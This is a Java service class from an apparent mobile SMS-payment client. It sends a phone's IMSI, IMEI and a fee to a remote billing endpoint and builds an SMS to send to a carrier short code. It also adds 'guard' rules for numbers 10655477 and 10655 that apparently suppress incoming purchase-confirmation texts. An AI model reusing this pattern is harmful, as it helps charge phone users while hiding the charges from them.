package com.jxt.pay.appclient.service.dynamic.net;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://sbscar.com/InterfaceWo/WoReq.aspx?imsi=460030912121001&imei=860275020104961&totalFee=6&callbackData=PUDR1001
 * @author leoliu
 *
 */
public class BjjsLt1DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsLt1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "imsi={imsi}&imei={imei}&totalFee={totalFee}&callbackData={callbackData}&subject={subject}&appName={subject}&&appKey={appKey}";
	
	private static final Guard guard0 = new Guard("10655477","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10655","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String totalFee = map.get("totalFee");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String callbackData = map.get("callbackData");
			
			if(callbackData==null || callbackData.length() == 0){
				callbackData = channel;
			}
			
			String appKey = map.get("appKey");
			if(appKey == null || appKey.length() == 0){
				appKey = "TS1001";
			}
			
			String subject = map.get("subject");
			if(subject.indexOf("%") < 0){
				subject = URLEncoder.encode(subject).toLowerCase();
			}
			
			String param = REQUESTMODEL.replace("{totalFee}",totalFee).replace("{imei}",imei).replace("{imsi}",imsi).replace("{callbackData}",callbackData).replace("{subject}",subject).replace("{appKey}",appKey);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String resultCode = jo.getString("resultCode");
				
				if("0".equals(resultCode)){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(jo.getString("sms"));
					sms.setSmsDest(jo.getString("accessNo"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard0);
					guardList.add(guard1);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}else{
					return DynamicUtils.parseError(resultCode);
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://sbscar.com/InterfaceWo/WoReq.aspx";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "bjjsLt1");
		map.put("channel", "10B101a87654322");
		map.put("imei", "860275020104961");
		map.put("imsi","460030912121001");
		map.put("totalFee","6");
		map.put("subject","动感影院");
		map.put("appKey", "TS1001");
		
		System.out.println(new BjjsLt1DynamicService().dynamic(map));
		
//		System.out.println(URLEncoder.encode("动感影院"));
	}
}
